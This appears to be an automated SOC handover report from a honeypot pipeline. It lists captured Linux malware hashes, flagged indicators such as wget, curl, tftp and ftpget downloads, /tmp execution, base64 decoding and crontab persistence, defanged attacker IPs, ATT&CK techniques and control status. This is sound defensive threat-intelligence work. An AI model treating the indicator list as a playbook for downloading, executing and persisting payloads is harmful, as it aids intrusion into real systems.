| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `58.17.128[.]7` | CN | China Unicom Chongqing province network | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `184.168.31[.]238` | US | GoDaddy.com, LLC | **100** ⚠️ | 19 |
| `114.30.180[.]58` | KR | HVHonam | **100** ⚠️ | 50 |
| `92.126.223[.]175` | RU | OJSC Sibirtelecom | **100** ⚠️ | 50 |
| `194.165.16[.]166` | LT | Flyservers S.A. | **100** ⚠️ | 50 |
| `24.142.170[.]231` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `178.178.222[.]53` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `136.56.34[.]147` | US | Google Fiber Inc. | **100** ⚠️ | 50 |
| `193.46.255[.]142` | RO | UNMANAGED LTD | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 359 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 328 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 13 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 12 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 524 cases |
| Tool 34  | Credential Extractor        | ✅ 362 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 133 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (6.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 89 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 328 priority case(s) shown individually · 45 recon entry/entries in table (21 group(s) consolidating 138 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-30T17:40:29Z_
